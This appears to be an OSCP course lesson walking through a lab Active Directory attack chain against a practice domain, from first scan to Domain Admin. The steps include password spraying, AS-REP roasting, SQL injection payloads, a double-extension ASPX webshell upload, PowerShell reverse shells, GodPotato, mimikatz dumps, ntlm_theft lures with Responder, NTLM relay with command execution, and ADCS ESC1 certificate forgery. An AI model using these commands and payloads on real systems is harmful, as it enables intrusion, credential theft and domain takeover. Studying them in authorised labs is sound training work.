
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 40 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_08

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/540486)[About this chain](https://hackerblueprint.com/labs#chain-08)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2008%3A%20Ricochet)

Tags

Port ScanningSMB EnumerationAD EnumerationLDAP EnumerationAS-REP RoastingPassword CrackingPassword ReuseADCS Abuse

PreviousCompletedNext: Chain 09: BloodhuntContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 08: Ricochet

Step 1 of 24

Close

0:00 / 2:45:59

Auto

1

Sweep the subnet for live hosts

BackNext step

Your lab addressesTarget IPDC IPYour IP

1. 1Sweep the subnet for live hosts_0:00_
    
    The engagement opens by spraying the subnet with netexec over SMB to see which machines answer. netexec is a network enumeration tool (the successor to CrackMapExec) that talks SMB, LDAP, WinRM, MSSQL and more. The sweep returns three Windows hosts: the domain controller, client1 and client2, all sitting on the same network.
    
    Because every host is directly reachable, there is no pivoting to set up. The presenter notes the three IPs and the role of each, which frames the whole chain: one DC and two clients, the classic three machine OSCP® AD layout.
    
    ```
    netexec smb SUBNET/24
    ```
    
    Copy
    
    Sweeps every address in the subnet over SMB. netexec prints the hostname, OS, domain and SMB signing status for each live host, which immediately tells you the DC from the two clients. Replace SUBNET/24 with your lab range.
    
    **Tip**Note the SMB signing column now. Signing disabled on a client is what later makes the NTLM relay attack possible.
    
2. 2Full TCP scan of all hosts_0:43_
    
    With the three IPs collected into a file, a full TCP nmap scan is launched against all of them at once. Scanning all 65535 ports matters because interesting services often hide above the common range, and a default scan would miss them.
    
    The scan runs in the background while other enumeration starts. nmap is the port and service scanner that maps what is listening and, with the right flags, grabs version banners and runs safe discovery scripts.
    
    ```
    nmap -p- -sC -sV -iL ips.txt -oA scan
    ```
    
    Copy
    
    `-p-` scans all 65535 TCP ports, `-sC` runs the default safe scripts, `-sV` asks each service for its version, `-iL ips.txt` reads the target list from a file, and `-oA scan` saves the output in all three formats. Runs from your Kali box.
    
    **Tip**A full port scan is slow. Start it early and do other work while it runs rather than waiting idle.
    
3. 3Collect BloodHound data with jgarcia_1:56_
    
    While nmap runs, the presenter sets up BloodHound to map the domain. BloodHound ingests users, groups, sessions and permission edges and draws attack paths as a graph. The initial jgarcia credential is enough to read this data over LDAP.
    
    After some Docker cleanup to reset a stale BloodHound instance, a fresh container comes up, the collected zip is uploaded, and jgarcia already appears in the graph. The point is to get a domain overview ready before diving into individual attacks.
    
    ```
    bloodhound-python -u jgarcia -p welcome2025 -d hackerblueprint.local -ns DC_IP -c all
    ```
    
    Copy
    
    Runs the Python collector as jgarcia against the domain, using the DC as the name server (`-ns`) and collecting everything (`-c all`). It produces a zip you upload into BloodHound. Runs from Kali.
    
    **Tip**If a BloodHound container is already running from a past session with an unknown password, bring the stack down and remove its volumes so it generates a fresh default admin password.
    
4. 4Read the scan, pick first targets_8:51_
    
    When the nmap scan finishes, each host is reviewed in turn. The DC shows LDAP, RPC, SMB, Kerberos (port 88), WinRM and a web server on port 80. client2 has RPC, SMB, RDP and WinRM and little else. client1 is the busiest: FTP, a website with a `/staff-portal` path already found by the nmap scripts, MSSQL and WinRM.
    
    The presenter builds a notes node listing the fastest and most promising leads to chase first: the client1 website, FTP, MSSQL, and a reminder to check Certipy for certificate attacks. Good notes keep a long chain from turning into chaos.
    
    **Tip**Keep a living list of leads and tick them off. On a multi host chain it is easy to forget an open service you saw an hour ago.
    
5. 5Find the AS-REP roastable account_12:55_
    
    Back in BloodHound, the pre-built Cypher query for Kerberoastable and AS-REP Roastable users is run. There are zero Kerberoastable accounts but one AS-REP Roastable account: service-archive. AS-REP Roasting works against accounts that have Kerberos pre-authentication disabled, letting anyone request an encrypted blob that can be cracked offline to recover the password.
    
    To attack it you first need the full list of domain users. netexec pulls every user over SMB and LDAP, which also catches passwords sometimes left in description fields.
    
    ```
    netexec smb DC_IP -u '' -p '' --users
    ```
    
    Copy
    
    Tries a null session against the DC over SMB and lists all domain users with their descriptions. The empty `-u` and `-p` attempt an unauthenticated bind.
    
    ```
    netexec ldap DC_IP -u '' -p '' --users
    ```
    
    Copy
    
    Does the same enumeration over LDAP, which often returns richer attributes. Running both protocols catches anything one misses.
    
    **Tip**Always read the user description fields. Admins sometimes store a temporary password there, which hands you a credential for free.
    
6. 6AS-REP roast and crack the hash_15:43_
    
    With the user list saved, GetNPUsers requests AS-REP data for any pre-auth disabled account without needing a password. It immediately returns a crackable hash for service-archive. The hash is then fed to John with rockyou and cracks to the password `softball1`.
    
    This is a second valid credential earned from nothing but a username list. The presenter stresses that running your known usernames across every protocol early can sometimes reveal a working password on its own.
    
    ```
    GetNPUsers.py -no-pass -usersfile users.txt -dc-ip DC_IP hackerblueprint.local/
    ```
    
    Copy
    
    The Impacket AS-REP roaster. `-no-pass` means no credential is needed, `-usersfile` is your username list, and `-dc-ip` points at the DC. Any account with pre-auth disabled returns a `$krb5asrep$` hash. Runs from Kali.
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
    ```
    
    Copy
    
    Cracks the saved AS-REP hash offline against the rockyou wordlist. John auto detects the `krb5asrep` format and recovers the cleartext password.
    
7. 7Spray credentials across every protocol_17:43_
    
    Both known passwords are written to a wordlist (`softball1` and jgarcia's password) and sprayed against all users and all hosts over every open service: SMB, RPC, WinRM, MSSQL, FTP and RDP. Password spraying checks whether the same credential is reused somewhere it should not be.
    
    The result is that jgarcia and service-archive authenticate across hosts but give no shell: SMB and RDP accept them but no `(Pwn3d!)` flag appears, MSSQL works only on client1, and FTP rejects both. The presenter spells out the lesson that valid authentication is not the same as a shell, so the hunt continues.
    
    ```
    netexec smb ips.txt -u users.txt -p pass.txt --continue-on-success
    ```
    
    Copy
    
    Sprays every user and password combination against every host over SMB. `--continue-on-success` keeps going after the first hit so you see every valid pair, not only the first. A `(Pwn3d!)` next to a result means admin access.
    
    ```
    netexec winrm ips.txt -u users.txt -p pass.txt --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over WinRM. A valid WinRM login with a plus sign usually means you can get an interactive shell with evil-winrm, so it is worth confirming separately from SMB.
    
    ```
    netexec mssql ips.txt -u users.txt -p pass.txt --continue-on-success
    ```
    
    Copy
    
    Checks the same credentials against MSSQL, which is only open on client1. A valid login here opens the door to database enumeration and possible command execution.
    
    **Tip**Spray RPC, FTP and RDP too, not only SMB and WinRM. People skip these and miss an easy foothold. Here RDP accepts the creds even though no shell comes from it.
    
8. 8First Certipy pass against the CA_27:44_
    
    Certipy checks Active Directory Certificate Services for misconfigured certificate templates, a common path to privilege escalation. It is run as jgarcia and service-archive against the DC. A certificate authority named `hackerblueprint-CA` exists, but no vulnerable template shows up for these two users yet.
    
    The key teaching point: unlike AS-REP Roasting, which you do once, certificate attacks must be rechecked for every new user you compromise, because template rights are granted per principal. This recheck is exactly what pays off much later with servicedeploy.
    
    ```
    certipy find -u jgarcia@hackerblueprint.local -p welcome2025 -dc-ip DC_IP -stdout -vulnerable
    ```
    
    Copy
    
    Enumerates the CA and its templates as jgarcia. `-stdout` prints to the terminal, `-vulnerable` filters to only the templates that can be abused. Run it again for each user you crack.
    
    **Tip**Make an ADCS recheck part of your checklist for every new credential. The same template can be unexploitable for one user and a straight path to Administrator for another.
    
9. 9Enumerate MSSQL and try a hash steal_30:33_
    
    MSSQL on client1 accepts both jgarcia and service-archive, so each is logged in with mssqlclient to compare access. Only one non-default database stands out, `staff_portal`, but neither account is sysadmin and the interesting database is permission denied for the second user.
    
    As a dead end worth seeing, Responder is started and xp_dirtree is abused to force the SQL server to reach out and leak a NetNTLMv2 hash. It fires, but the captured hash belongs to the client1 machine account, which is not useful here. The presenter wraps up MSSQL and moves to the websites.
    
    ```
    mssqlclient.py hackerblueprint.local/service-archive:softball1@TARGET_IP -windows-auth
    ```
    
    Copy
    
    Connects to MSSQL on client1 as a domain user. `-windows-auth` uses AD authentication rather than a SQL login. From here you can list databases and test for command execution. TARGET_IP is client1.
    
    ```
    responder -I tun0
    ```
    
    Copy
    
    Starts Responder on the VPN interface to catch any NTLM authentication the SQL server can be coerced into sending, for example via an xp_dirtree path lookup to your box.
    
    **Tip**A captured machine account hash (ending in a dollar sign) is rarely crackable and cannot be used like a normal user hash, so treat it as a dead end unless you have a specific plan for it.
    
10. 10Enumerate the websites, find staff-portal_40:20_
    
    Both web servers are reviewed. The DC site is a blank, branded ASP on IIS page with nothing exploitable. client1 hosts a custom application at `/staff-portal`, discovered earlier through robots.txt during the nmap script scan. Because it is bespoke with no public exploit, the presenter reasons the sensible next checks are authentication bypass, default credentials and credential reuse, not CVE hunting.
    
    Trying the known credentials and simple guesses like admin/admin on the login form all fail, which sets up the manual SQL injection testing that follows.
    
    ```
    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://TARGET_IP/FUZZ
    ```
    
    Copy
    
    Directory brute forces the web root when robots.txt gives nothing. `-w` is the wordlist and `FUZZ` is where ffuf substitutes each word. Here the path was already known, but this is the fallback.
    
    **Tip**For a fully custom app, searching for known exploits wastes time. Think in terms of classes of bug: auth bypass, injection, upload, insecure direct object reference.
    
11. 11SQL injection auth bypass with Burp_48:01_
    
    The login POST request is captured through Burp (its proxy is moved to port 8081 because BloodHound already uses port 8080) and sent to Intruder. A short list of SQL injection auth bypass payloads is fired at the username and password fields with a Sniper attack, watching for a redirect status as the success signal.
    
    Two payloads return a 302 redirect to `staff-portal/Dashboard.aspx`, proving an authentication bypass. In Repeater the body decodes to `username=' or x=x`, and tautology tests confirm it: `12=12` logs in while `12=13` fails. The presenter notes that fully automated tools like sqlmap are not exam legal, but sending payloads one at a time through Intruder or Repeater is acceptable.
    
    ```
    ' or x=x-- -
    ```
    
    Copy
    
    The working auth bypass payload placed in the username field. The `or x=x` makes the WHERE clause always true so the query returns a row and logs you in, and `-- -` comments out the rest of the original query.
    
    **Tip**A redirect (302) to a dashboard is a reliable sign a login bypass worked, even before you see the page. Sort Intruder results by status code to spot it fast.
    
12. 12Confirm UNION injection, fingerprint MSSQL_53:00_
    
    The portal also exposes an `id` parameter. Adding a single quote changes which user record returns and throws errors, confirming a second, more powerful injection point. `ORDER BY` is walked up until it breaks at 3, meaning the query has two columns, and a UNION SELECT with a `-1` base row forces the injected output to render on the page.
    
    Injecting `@@version` into a visible column fingerprints the backend as Microsoft SQL Server. With a reflected output channel and the database type known, the goal shifts to extracting data.
    
    ```
    ' ORDER BY 3-- -
    ```
    
    Copy
    
    Increments the column index until the query errors. It works at 1 and 2 but breaks at 3, so the underlying SELECT returns two columns, which you must match in a UNION.
    
    ```
    UNION SELECT -1,@@version,'x'--
    ```
    
    Copy
    
    Uses a non existent base row (`-1`) so only the injected row shows, and places `@@version` in a visible column. The returned banner confirms the backend is MSSQL, which decides the syntax you use next.
    
13. 13Dump schema and extract the admin password_57:56_
    
    The injection is used methodically: current database via `DB_NAME()` (returns `staff_portal`), then all databases, tables and columns. Because a naive query shows only one row at a time, the MSSQL `STRING_AGG` function concatenates every row into one string so a whole list fits in a single reflected field. The `staff_portal` database has two tables, `users` and `employees`, and the `users` table yields the admin account with the value `admin2024`.
    
    Follow up checks then close the avenue: a sysadmin role check returns zero, an xp_cmdshell style command and an outbound curl both fail for lack of privilege. So the injection gives data but no code execution, and the file upload becomes the real path in.
    
    ```
    UNION SELECT -1,(SELECT STRING_AGG(name, ',') FROM sys.databases),'x'--
    ```
    
    Copy
    
    `STRING_AGG(name, ',')` joins every database name into one comma separated string so they all appear in the single visible column, instead of one row at a time.
    
    ```
    UNION SELECT -1,(SELECT STRING_AGG(table_name, ',') FROM information_schema.tables),'x'--
    ```
    
    Copy
    
    Lists all table names from the information schema in one field. This reveals the `users` and `employees` tables in the staff_portal database.
    
    ```
    UNION SELECT -1,(SELECT STRING_AGG(column_name, ',') FROM information_schema.columns WHERE table_name='users'),'x'--
    ```
    
    Copy
    
    Narrows the column dump to the `users` table with a WHERE clause, exposing the id, username and password columns ready to extract.
    
    **Tip**Enumerating databases, then tables, then columns, then rows in that order is a clean methodology. Even when, as here, it does not hand you a usable shell, it proves you understand the injection.
    
14. 14File upload bypass to a webshell_1:18:47_
    
    The portal has an update photo feature that claims to accept only JPG, PNG and GIF. Uploading a `.aspx` shell is rejected as an invalid file type, and changing the Content-Type header to `image/png` or `image/gif` does not help. The filter is beaten with a double extension: naming the file `photo.png.aspx` passes, because the app accepts the name for containing an allowed `.png` extension while IIS still runs the file as `.aspx` based on its real final extension.
    
    Opening the uploaded file in a browser runs the webshell. The presenter points out this means the earlier SQL injection was not even needed for a foothold, a simple upload bypass was enough.
    
    ```
    CMDASP1.png.aspx
    ```
    
    Copy
    
    The crafted filename for the webshell upload. The double extension slips past the server side extension check while IIS still runs it as ASPX. Set the Content-Type to image/png in Burp alongside it.
    
    **Tip**If a filter strips the bad extension instead of only checking it, craft the name so that removing the stripped part leaves your extension behind, for example a name that becomes `.aspx` only after the filter edits it.
    
15. 15Catch a reverse shell as webapp_1:29:27_
    
    The webshell reports it runs as the IIS application pool user `webapp`. A base64 encoded PowerShell reverse shell is generated at revshells.com with the attacker IP, a netcat listener is started, and running the payload through the webshell catches a working shell.
    
    The presenter advises against rlwrap on Windows shells because it interferes with stabilization, and notes a native Windows listener setup gives arrow key history and clear screen for free.
    
    ```
    nc -lvnp PORT
    ```
    
    Copy
    
    Starts a netcat listener on your Kali box to catch the incoming shell. `-l` listens, `-v` is verbose, `-n` skips DNS, `-p` sets the port, which must match the one baked into the payload.
    
    **Tip**Check whoami first. Seeing an IIS app pool identity like webapp tells you a SeImpersonatePrivilege based potato attack is the likely next move.
    
16. 16GodPotato to SYSTEM on client1_1:30:53_
    
    App pool accounts hold SeImpersonatePrivilege, which the potato family of exploits abuses to impersonate SYSTEM. GodPotato is the recommended starting tool. The binary is pulled onto the target with wget, then run with a command flag to execute a payload as the impersonated token.
    
    After a couple of stale session retries and a filename fix, GodPotato runs and returns an elevated NT AUTHORITY\SYSTEM shell on client1, completing local privilege escalation on the first host.
    
    ```
    wget http://YOUR_IP:PORT/GodPotato.exe -OutFile GodPotato.exe -UseBasicParsing
    ```
    
    Copy
    
    Downloads GodPotato from your Kali web server onto the target. In the PowerShell shell `wget` is Invoke-WebRequest, so `-OutFile` names the local file and `-UseBasicParsing` avoids the Internet Explorer engine dependency.
    
    ```
    .\GodPotato.exe -cmd "cmd /c whoami"
    ```
    
    Copy
    
    Runs GodPotato and executes the given command as the impersonated SYSTEM token. Start with whoami to confirm it works, then swap in a reverse shell command to catch a SYSTEM shell.
    
    **Tip**If the exploit fails oddly, suspect a stale or expired webshell session rather than the exploit itself. Re-upload the payload and retry before changing approach.
    
17. 17Local admin and mimikatz on client1_1:37:20_
    
    With SYSTEM on client1, jgarcia is added to the local Administrators group, then mimikatz is run to dump SAM hashes and LSA secrets. LSA often caches domain credentials useful for lateral movement, so it is always worth a look.
    
    Here the dump finds nothing new. The presenter reasons that since SYSTEM is already held on client1, cracking a local hash for RDP is low value, and shifts focus to hunting the filesystem for credentials that enable movement to another host.
    
    ```
    net localgroup administrators jgarcia /add
    ```
    
    Copy
    
    Adds the domain user jgarcia to the local Administrators group on client1, so that credential now has admin rights on this host. Run from the SYSTEM shell.
    
    ```
    mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" exit
    ```
    
    Copy
    
    Dumps local account hashes from the SAM and any secrets cached by LSA. `privilege::debug` and `token::elevate` get the SYSTEM rights the dump needs.
    
18. 18Hunt the filesystem for credentials_1:40:56_
    
    To move laterally, the whole filesystem is searched for leftover credentials, run from the SYSTEM session because it has the widest read access. A broad keyword search produces a lot of noise, so the presenter iteratively excludes known junk paths (Microsoft SQL, VMware, Bootstrap, Windows apps) until real results surface.
    
    The payoff is a credential set for mharris found in an HRConnect HRDataSync file, duplicated in an all users copy. It is tedious manual work, but it reliably finds secrets that automated tools can miss.
    
    ```
    Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "password","pwd","user="
    ```
    
    Copy
    
    Recursively searches every readable file for credential keywords. `-ErrorAction SilentlyContinue` skips access denied noise, and Select-String matches the patterns. Pipe the output through exclusions to cut known junk.
    
    **Tip**Build your noise filter as you go and save the final command. Paths like VMware, Bootstrap and the Microsoft SQL directories almost never hold the credential you want.
    
19. 19Retest mharris, find a writable share_2:00:59_
    
    Every new credential must be retested everywhere, so mharris (password `finance2024`) is sprayed across all protocols, rechecked in Certipy, and used to list SMB shares. Spraying shows valid access and RDP on client2 but no shell, and Certipy finds nothing for mharris.
    
    The important find is a share named `shared` on the domain controller that mharris can write to. A writable share on a DC is a strong setup for a hash theft or relay attack, so it is flagged for the next phase. The files inside turn out to hold no credentials, confirming the share itself is the attack surface.
    
    ```
    netexec smb DC_IP -u mharris -p finance2024 --shares
    ```
    
    Copy
    
    Lists every SMB share mharris can see on the DC and shows READ or WRITE next to each. A WRITE on a non default share like `shared` is the lead that drives the NTLM theft.
    
    ```
    certipy find -u mharris@hackerblueprint.local -p finance2024 -dc-ip DC_IP -stdout -vulnerable
    ```
    
    Copy
    
    Rechecks ADCS as mharris. Running this for each new user is the discipline that eventually finds the ESC1 template, even though mharris yields nothing.
    
    **Tip**Enumerate shares with every user you own, not only the newest. Different accounts can see and write to different shares.
    
20. 20Steal a NetNTLMv2 hash with ntlm_theft_2:09:19_
    
    A writable share named shared or public is a textbook target for ntlm_theft, a tool that generates malicious files which make Windows Explorer reach out to an attacker controlled SMB server, coercing NTLM authentication, when a user merely previews the folder. The tool is cloned and run with `-g all` to produce every file type, pointed at the attacker IP.
    
    Responder is left listening. When a crafted `.lnk` file is dropped into the share, a NetNTLMv2 hash for twright is captured almost instantly, because Explorer auto previews the folder on the DC. Removing and replacing the file reproduces the capture.
    
    ```
    git clone https://github.com/Greenwolf/ntlm_theft
    ```
    
    Copy
    
    Clones the ntlm_theft tool, which builds lure files (.lnk, .scf, .url, .htm and more) that trigger an SMB callback when parsed by Explorer.
    
    ```
    python3 ntlm_theft.py -g all -s YOUR_IP -f a
    ```
    
    Copy
    
    Generates every lure file type (`-g all`) with your IP as the catcher server (`-s`) and the output basename `a` (`-f`). Each file, once on the share, makes a browsing user authenticate to you.
    
    ```
    put a.lnk
    ```
    
    Copy
    
    Run inside an smbclient session connected to the writable share, this uploads the .lnk lure. Windows then previews it and leaks the NetNTLMv2 hash of whoever is browsing the share to your Responder listener.
    
    **Tip**Deploy the lab machine from its clean snapshot and do not patch it. Windows updates disable the Explorer auto preview behaviour this attack depends on.
    
21. 21Crack the captured twright hash_2:17:28_
    
    The captured hash is a NetNTLMv2 hash, which, unlike an NT hash, cannot be used directly for pass-the-hash. It must be cracked offline or relayed. John with rockyou identifies the format and recovers twright's password, which is added to the credentials list.
    
    The presenter stresses this technique is squarely in OSCP® scope, which is why it is worth drilling.
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt twright.txt
    ```
    
    Copy
    
    Cracks the saved NetNTLMv2 hash against rockyou. John auto detects the `netntlmv2` format and prints the cleartext password once found.
    
    **Tip**Know the difference between hash types. An NT hash can be replayed with pass-the-hash, but a NetNTLMv2 hash can only be cracked or relayed.
    
22. 22Demonstrate NTLM relay and SMB signing_2:19:34_
    
    As an alternative to cracking, the presenter demonstrates ntlmrelayx, which forwards a captured authentication to a different machine, like a cross host pass-the-hash. A target file lists the chain IPs and the lure is dropped again to coerce twright's authentication, which originates from client2.
    
    The relay to the DC fails because the DC enforces SMB signing, while client1, a Windows 10 host with signing disabled, accepts the relay and lets ntlmrelayx dump its hashes or, with `-c`, run a payload for a SYSTEM shell. Since client1 is already owned and the request cannot be relayed back to its source (client2), the relay is not strictly needed here, but it is an essential technique to understand. Responder with `-A` can still capture the hash passively, which is exam safe.
    
    ```
    ntlmrelayx.py -tf targets.txt -smb2support
    ```
    
    Copy
    
    Relays incoming NTLM authentication to the hosts in `targets.txt`. `-smb2support` enables SMB2. It only succeeds against targets where SMB signing is not enforced, so it works on client1 but not the DC.
    
    ```
    ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -e BASE64PAYLOAD"
    ```
    
    Copy
    
    Adds `-c` to execute a command on a successfully relayed host, here a base64 PowerShell reverse shell, returning a SYSTEM shell on client1 when twright authenticates.
    
    ```
    responder -I tun0 -A -v
    ```
    
    Copy
    
    Runs Responder in analyze mode (`-A`), which captures hashes without actively poisoning, and `-v` for verbose output. This passive capture is acceptable on the exam.
    
    **Tip**A relay works only where SMB signing is disabled. Check the signing column from your early netexec sweep to know in advance which hosts are relay targets.
    
23. 23Move to client2, crack servicedeploy_2:33:34_
    
    Because the twright request came from client2, it cannot be relayed there, so the cracked twright password is sprayed instead and returns a pwned result on client2. Dumping local secrets on client2 reveals a new account, servicedeploy, stored as a cached domain credential.
    
    A cached domain credential cannot be used for pass-the-hash or relaying, so it must be cracked. hashcat in the DCC2 mode recovers servicedeploy's password. The presenter recaps the standard privesc checklist (BloodHound, Certipy, protocols, mimikatz, credential scripts, ports, PowerShell history) that surfaced it.
    
    ```
    netexec smb TARGET_IP -u twright -p PASSWORD --lsa
    ```
    
    Copy
    
    Logs into client2 as twright with admin rights and dumps LSA secrets, including cached domain logons. This is where the servicedeploy cached credential appears. TARGET_IP is client2.
    
    ```
    hashcat -m 2100 servicedeploy.hash /usr/share/wordlists/rockyou.txt
    ```
    
    Copy
    
    Cracks the cached domain credential. Mode `2100` is Domain Cached Credentials 2 (DCC2), the format Windows stores for cached domain logons, against rockyou.
    
    **Tip**A cached domain credential (DCC2) is neither pass-the-hash-able nor relayable. If you cannot crack it, it gives you nothing, so prioritise a good wordlist.
    
24. 24ADCS ESC1 abuse to Administrator_2:39:47_
    
    Rechecking Certipy as servicedeploy finally pays off: the account can enrol in a template that is vulnerable to ESC1, meaning it allows the enrollee to specify an arbitrary subject name. The presenter requests a certificate for servicedeploy but sets the UPN to administrator, the default domain admin, using the `hackerblueprint-CA` and the `CorpWebServer` template. Certipy produces an `administrator.pfx`.
    
    Authenticating with that certificate returns the administrator NT hash, which is then used with secretsdump to dump the domain and with a psexec style login to get a full SYSTEM shell on the domain controller. The chain is complete.
    
    ```
    certipy find -u servicedeploy@hackerblueprint.local -p PASSWORD -dc-ip DC_IP -stdout -vulnerable
    ```
    
    Copy
    
    The ADCS recheck as servicedeploy that reveals the ESC1 vulnerable template. This is the recheck for every user discipline finally finding a path.
    
    ```
    certipy req -u servicedeploy@hackerblueprint.local -p PASSWORD -dc-ip DC_IP -ca hackerblueprint-CA -template CorpWebServer -upn administrator@hackerblueprint.local
    ```
    
    Copy
    
    Requests a certificate as servicedeploy but with `-upn administrator`, abusing ESC1 to impersonate the domain admin. It writes `administrator.pfx`.
    
    ```
    certipy auth -pfx administrator.pfx -dc-ip DC_IP
    ```
    
    Copy
    
    Authenticates to the DC with the forged certificate and returns the administrator NT hash, which can then be replayed with pass-the-hash.
    
    ```
    secretsdump.py hackerblueprint.local/administrator@DC_IP -hashes :ADMIN_NT_HASH
    ```
    
    Copy
    
    Uses the recovered administrator NT hash to dump every domain secret from the DC, confirming full domain compromise. Swap in the hash from certipy auth.
    
    **Tip**ESC1 means the template lets the requester supply the subject, so you can ask for a certificate as Administrator. Always note the exact CA and template names Certipy prints, you need both in the request.
